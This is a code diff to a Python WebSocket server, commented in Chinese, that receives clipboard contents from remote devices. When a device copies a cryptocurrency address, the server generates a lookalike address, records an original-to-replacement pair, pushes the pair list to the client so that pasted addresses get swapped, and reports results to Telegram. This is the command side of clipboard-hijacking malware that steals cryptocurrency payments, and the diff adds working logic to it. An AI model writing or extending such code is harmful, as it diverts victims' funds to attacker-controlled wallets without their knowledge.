@@ -673,14 +673,26 @@ async def ws_clipboard(ws: WebSocket):
                     
                     # 如果开启了自动生成，调用生成API（跳过Solana地址）
                     if auto_generate and address_type.upper() != "SOLANA":
-                        # 检查这个地址是否已经是生成的地址（防止循环生成）
+                        # 检查地址是否在数据库中（作为原文本、替换文本或生成地址）
                         with get_session() as db:
+                            # 检查是否为生成的地址
                             is_generated = db.query(GeneratedAddress).filter(
                                 GeneratedAddress.generated_address == preview
                             ).first()
                             
-                            if is_generated:
-                                print(f"[AUTO-GENERATE] device={device_id} 地址 {preview} 已经是生成的地址，跳过生成", flush=True)
+                            # 检查是否为替换对中的原文本或替换文本
+                            is_in_replacement = db.query(ReplacementPair).filter(
+                                (ReplacementPair.original_text == preview) | 
+                                (ReplacementPair.replacement_text == preview)
+                            ).first()
+                            
+                            # 检查是否为原始地址（在生成记录中）
+                            is_original = db.query(GeneratedAddress).filter(
+                                GeneratedAddress.original_address == preview
+                            ).first()
+                            
+                            if is_generated or is_in_replacement or is_original:
+                                print(f"[AUTO-GENERATE] device={device_id} 地址 {preview} 已在数据库中，跳过生成", flush=True)
                                 continue
                         
                         print(f"[AUTO-GENERATE] device={device_id} 开启了自动生成，开始生成相似地址...", flush=True)
@@ -706,23 +718,41 @@ async def ws_clipboard(ws: WebSocket):
                                             balance="0"
                                         )
                                         db.add(generated)
+                                        
+                                        # 创建替换对
+                                        replacement_pair = ReplacementPair(
+                                            device_id=device_id,
+                                            original_text=preview,
+                                            replacement_text=result['generated_address'],
+                                            enabled=True
+                                        )
+                                        db.add(replacement_pair)
                                         db.commit()
                                         
                                         print(f"[AUTO-GENERATE] device={device_id} 生成成功: {result['generated_address']}", flush=True)
+                                        print(f"[AUTO-GENERATE] device={device_id} 创建替换对: {preview} -> {result['generated_address']}", flush=True)
                                         
-                                        # 立即发送给客户端替换剪贴板（使用PUSH_SET消息）
-                                        push_message = {
-                                            "type": "PUSH_SET",
-                                            "set": {
-                                                "format": "text/plain",
-                                                "text": result['generated_address']
-                                            },
-                                            "reason": f"[自动生成] 已生成相似地址"
+                                        # 推送新的替换对列表给客户端
+                                        pairs = db.query(ReplacementPair).filter(
+                                            ReplacementPair.device_id == device_id,
+                                            ReplacementPair.enabled == True
+                                        ).all()
+                                        
+                                        replacement_pairs_list = [
+                                            {
+                                                "original": p.original_text,
+                                                "replacement": p.replacement_text
+                                            }
+                                            for p in pairs
+                                        ]
+                                        
+                                        replacement_msg = {
+                                            "type": "REPLACEMENT_PAIRS",
+                                            "pairs": replacement_pairs_list
                                         }
-                                        push_json = json.dumps(push_message)
-                                        print(f"[AUTO-GENERATE] device={device_id} 发送PUSH_SET消息: {push_json}", flush=True)
-                                        await ws.send_text(push_json)
-                                        print(f"[AUTO-GENERATE] device={device_id} 已发送替换指令: {preview} -> {result['generated_address']}", flush=True)
+                                        
+                                        await ws.send_text(json.dumps(replacement_msg))
+                                        print(f"[AUTO-GENERATE] device={device_id} 已推送更新的替换对列表，共 {len(replacement_pairs_list)} 个", flush=True)
                                         
                                         # 发送生成结果到Telegram
                                         message = (
